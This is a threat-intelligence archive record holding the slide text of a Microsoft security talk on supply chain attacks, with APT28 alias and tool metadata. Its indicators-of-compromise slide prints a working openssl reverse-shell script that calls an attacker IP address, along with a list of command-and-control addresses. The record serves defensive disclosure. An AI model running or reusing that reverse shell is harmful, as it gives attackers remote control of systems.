{
    "id": "df18ebd9-2d0e-469f-86c9-5d2245e2cfba",
    "created_at": "2022-10-25T16:48:18.772773Z",
    "updated_at": "2025-03-27T02:17:11.49571Z",
    "deleted_at": null,
    "sha1_hash": "699c3c2b3a868cc22f29584a128918f672060986",
    "title": "Microsoft Bounty Program",
    "authors": "",
    "file_creation_date": "2019-08-08T11:29:23Z",
    "file_modification_date": "2019-08-08T11:29:23Z",
    "file_size": 3630220,
    "plain_text": "###### The Enemy Within Modern Supply Chain Attacks\n\n Eric Doerr, GM Microsoft Security Response Center (MSRC)\n @edoerr\n\n\n-----\n\n###### We all know the world rests on a giant turtle…\n\n\n-----\n\n###### way down…\n\n\n-----\n\n#### I’m in your supply chain,\n\n and you’re in mine.\n\n We’re in this together.\n\n\n-----\n\n###### Am I in your supply chain?\n\n##### Are you in mine?\n\n###### • Linux is the most popular OS on Azure\n\n • >35k unique OSS projects\n\n • >10K 3[rd] party tools\n\n • Surface, Hololens, Xbox hardware suppliers\n\n • Server infrastructure in the Microsoft cloud\n\n\n-----\n\n###### Media is overly focused on hardware\n\n Supply chain > hardware\n\n\n-----\n\n###### I’m not talking about…\n\n OR\n\n And definitely not\n\n\n-----\n\n### Evaluating supply chain risk\n\n\n-----\n\n###### How we think about Supply Chain Risk\n\n Hardware Software Services People\n\n\n-----\n\n## How do we defend Microsoft?\n\n###### Commonalities & differences\n\n\n-----\n\n###### Number of Number of countries Authentication employees with Microsoft offices requests per month\n\n Managed devices On-premises Microsoft Teams hitting the workload reduction meetings/month630B network\n\n Transactions on Data Centers\n Cloud based services\n the sales platform\n worldwide100+842K\n per day\n\n\n-----\n\n###### Microsoft Cloud140Countries54Regions\n\n\n-----\n\n#### Microsoft is a complex company to\n defend… how do we do it?\n\n\n-----\n\n###### • Centralized hubs for cybersecurity and\n defense; uniting personnel from each defender team\n\n • Shared technology, analytics,\n playbooks\n\n • Shared locations, and more\n importantly a commitment to “defend together”\n\n • 24 x 7 x 365 protection of Microsoft\n platform and customers\n\n\n-----\n\n###### People\n### Let’s talk about people\n\n\n-----\n\n###### There are people in your supply chain\n\n\n-----\n\n###### Gift Card abuse\n\n\nDuring unknown time period, a financially motivated\nthreat actor allegedly compromises Wipro network and\ngains access to multiple companies through trusted\nvendor relationships\n\n\n**3[rd]** **PARTY**\n**REPORTING**\n\n\n###### 2 Apr 2019 CDOC teams mobilized\nbased on reports of potential\ncompromise to determine the risk\nexposure of to Microsoft and\nMicrosoft customers.\n\n\n**Credential**\n**compromise**\n\n\n**Backdoor** **Lateral**\n\n**C&C** **movement**\n\n\nMicrosoft\nVendors 3\n**(People)**\n\n\n**Apr 2019 After a thorough**\ninvestigation, no malicious\nactivity observed within\nMicrosoft.Potential Impact\n\n\n**Response**\n\n###### • Risk assessment and vendor inventory audit performed\n • Block newly identified malicious domains\n • Precautionary reset of credentials for vendor accounts\n • Additional monitoring of systems belonging vendor employees\n • Windows Defender signature deployed to detect adversary’s specific Mimikatz Binary\n\n\n-----\n\n###### Practical Advice\n Securing people in your supply chain\n\n • Always “assume breach”\n\n • Strict inventory of vendor & partner access\n\n • Automated policy governance where possible\n\n • Follow principle of least privilege\n\n • Provide devices and/or virtual monitoring\n\n • Any privileged access needs tighter controls (MFA etc) and detection systems in place\n\n\n-----\n\n###### Software\n### Let’s talk about software\n\n\n-----\n\n###### There is software in your supply chain\n\n\n-----\n\n**April 2018 Reports that Team Viewer**\nsoftware and/or infrastructure is\nleveraged by threat actor\n\n**BACKDOOR** **SUPPLY CHAIN**\n\n**ATTACK**\n\n**OEM**\n\n**2**\n\nOEMs use service for provisioning and\ntroubleshooting of physical machines\n\n\nThreat Actor could leverage service to\n\n**4** install firmware or bios implants on\n\nphysical machines during OEM\ndeployment\n\n**MALICIOUS**\n\n**CODE**\n\n###### 3[rd] Party\n Service\n\nService is connected to internal\nresources for deployment of new\nhardware\n\n**May 2018**\nAppLocker and firewall blocking\ninitiated against service files and\nconnections\n\n\nMachines are re-imaged\nprior to delivery or\ndeployment\n\n\n###### Potential Actions on Objective\n\n\n**Physical**\n**Machine**\n\n\nTheoretically an implant could remain after provisioning:\n\n- **Steal data**\n\n- **Disrupt or deny access**\n\n- **Distribute and Manage Malware**\n\n\n**Response**\n\n\n\n###### • Performed audit of software usage to assess risk if software was compromised\n • Update policy to block remote access software\n • Notifications sent to impacted employees\n • AppLocker and firewall blocks put in place\n • Updated contracts with suppliers\n\n\n-----\n\n###### Practical Advice\n\n Securing Software in your supply chain\n\n Pre-Selection Selection Contract Onboard Monitor Terminate\n\nShortlist software _Risk Profiling &_ _Standard Contract_ _Remediation_ _Risk Profiling_ _Termination Support_\nsolutions and _Assessment Services_ _Language Review &_ Ensure customers/ _Continuous_\nsuppliers with strong _Contract Negotiation_ business groups are _Monitoring_ Implement necessary\nsecurity credentials. Enable the selection _Consulting_ aware of any ongoing safeguards for\n\nof software solutions expectations related Perform monitoring solutions being\n\nKick off security and suppliers which Apply enforceable to their chosen and periodic re- decommissioned and\nengagements during adhere to defined terms to contracts in software solutions assessments based provide termination\nRFP and shortlisting Microsoft Security relation to Microsoft and suppliers. on the status of and support.\nphase. requirements. Security and Privacy changes to the risk\n\nEnsure suppliers are\n\nrequirements. profiles. Perform periodic\n\ncommitted to the\n\nPerform security review of software\n\nrequirements set\n\nassurance prior to Investigate changes solution usage and\n\nforth for their\n\ncontract negotiations in risk assessment contract information\n\nsoftware solutions\n\nto enable customers/ and move to to identify solutions\n\nand organization, and\n\nbusiness groups to termination if they which are inactive or\n\ntheir responsibility to\n\nmake risk-based cannot be quickly expected to be\n\nremediate any known\n\ndecision. addressed. decommissioned.\n\nor open issues.\n\n\n-----\n\n###### Services\n### Let’s talk about services\n\n\n-----\n\n#### Do you inventory every service you use?\n\n\n-----\n\n###### Upstream vs. Downstream\n\n Upstream Downstream\n • DNS • Financial outsourcing\n • PKI • Content delivery networks\n • Cloud service providers • Distribution services (e.g.\n Github, Dropbox, etc.)\n\n • VPN service providers\n\n • Push networks\n\n • ISPs\n\n • Any business partner that helps\n\n • Any business partner you rely\n you provide services to your\n on to provide you services\n\n\n-----\n\n**MULTI-FACTOR**\n**AUTHENTICATION**\n\n\n**MULTI-FACTOR**\n**AUTHENTICATION**\n\n\nhighlighting security research\nreporting an exposed database\nassociated with an SMS subprocessor.\n\n**SCANNING**\n\n\n###### Sub-processors\n\n**Phone Number** **Phone Number**\n\n**Phone Number** **Access Code** Telco Provider **Access Code**\n\n**Access Code**\n\n###### 2 The data exposed encompassed\n\nSMS messages containing phone\nnumbers and short-term access\ncodes.\n\n**ERROR, NEGLECT**\n\n**LEAK/EXFILTRATE DATA**\n\n**ACTIONS ON THE**\n\n**OBJECTIVE**\n\n\n**Response**\n\n###### • Inspected exposed data to evaluate risk\n • Expired all valid one-time tokens immediately to contain risk\n • Work began to investigate the scope and impact of the potential disclosure\n • Investigated potential attempted or successful logins\n • No misuse of the two-factor codes was identified\n\n\n-----\n\n###### Hardware\n### Ok, let’s talk about hardware\n\n\n-----\n\n###### 4 Compromised account logged in to IP\n\naddresses associated with IOT devices\n\ntelephony\n\nfrom external VPNs.\n\n**Security control** **Credential**\n\n**evasion** **compromise** **BackdoorC&C**\n\n###### 5 Incident Responders reset\n\npasswords, pull the hard disk\nof the printer, and block\nknown domains.\n\n\n**Apr 2019 The Microsoft Threat**\nIntelligence Center (MSTIC)\ndiscovered suspicious activity\nfrom infrastructure previously\nassociated with the STRONTIUM\ntargeting several 3[rd] party\ncustomers.\n\n\nInternet facing video\ndecoder device with default\ncredentials used to establish\na link into targeted\nnetworks.\n\n\nVPN\n\n\n**ACTIONS ON THE**\n\n**OBJECTIVE**\n\n\ncredentials used to establish\ninto targeted\n\n\n**RECONNAISSANCE**\n\n**Response**\n\n###### • Mobilized CDOC responders to investigate and partner with 3[rd] party customer security teams\n • IOT devices were quarantined and sent for forensic analysis\n • Impacted service account credentials were changed\n • Malicious domains and IPs were blocked on affected networks\n • Proactively shared adversary TTPs with IOT vendors\n\n\n###### IoT\n\n\n-----\n\n###### Indicators of Compromise (1/2)\n\n —contents of [IOT Device] file--\n\n #!/bin/sh\n\n export [IOT Device] =\"-qws -display :1 -nomouse\"\n\n echo 1|tee /tmp/.c;sh -c '(until (sh -c \"openssl s_client -quiet -host 167.114.153.55 -port 443 |while : ; do sh && break; done| openssl s_client -quiet -host 167.114.153.55 -port 443\"); do (sleep 10 && cn=$((`cat /tmp/.c`+1)) && echo $cn|tee /tmp.c && if [ $cn -ge 30 ]; then (rm /tmp/.c;pkill -f 'openssl'); fi);done)&' &\n\n\n-----\n\n###### Indicators of Compromise (2/2)\n\n The following IP addresses are believed to have been used by the actor for command and control (C2):\n\n 167.114.153.55\n\n 94.237.37.28\n\n 82.118.242.171\n\n 31.220.61.251\n\n 128.199.199.187 More details on our blog https://msrc- blog.microsoft.com/2019/08/05/corporate\n\n\n-----\n\n### 4 Takeaways\n\n\n-----\n\n# 1\n\n## Share More\n\n#### Let’s make the adversaries work harder\n\n by working together.\n\n\n-----\n\n###### How can we share more?\n\n We need to change our cultural approach\n\n • Media: “name and shame”  “learn and defend together”\n\n • Customer: “why was there an issue”  “how did they respond?”\n\n • Business: “containment & opacity”  “partnership & transparency”\n\n • Disclosure: “code defects”  “tactics that work”\n\n\n-----\n\n# 2\n\n## Response matters\n\n#### We should focus more on how companies\n respond to security events, not whether\n they happen.\n\n\n-----\n\n###### Remember, we’re all in this together\n\n Best Practices:\n\n • Proactively inform customer of impact\n\n • Engage transparently and without defensiveness\n\n • Respond to reasonable requests for validation\n\n • Learn from mistakes\n\n\n-----\n\n# 3\n\n## Sweat the small stuff\n\n#### Adversaries will find the path of least\n resistance.\n\n\n-----\n\n# 4\n\n## Embrace the whole\n\n#### People + Software + Services + Hardware\n\n = Supply Chain\n\n\n-----\n\n### Thanks!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://i.blackhat.com/USA-19/Thursday/us-19-Doerr-The-Enemy-Within-Modern-Supply-Chain-Attacks.pdf"
    ],
    "report_names": [
        "us-19-Doerr-The-Enemy-Within-Modern-Supply-Chain-Attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1565263763,
    "ts_modification_date": 1565263763,
    "files": {
        "pdf": "https://archive.orkl.eu/699c3c2b3a868cc22f29584a128918f672060986.pdf",
        "text": "https://archive.orkl.eu/699c3c2b3a868cc22f29584a128918f672060986.txt",
        "img": "https://archive.orkl.eu/699c3c2b3a868cc22f29584a128918f672060986.jpg"
    }
}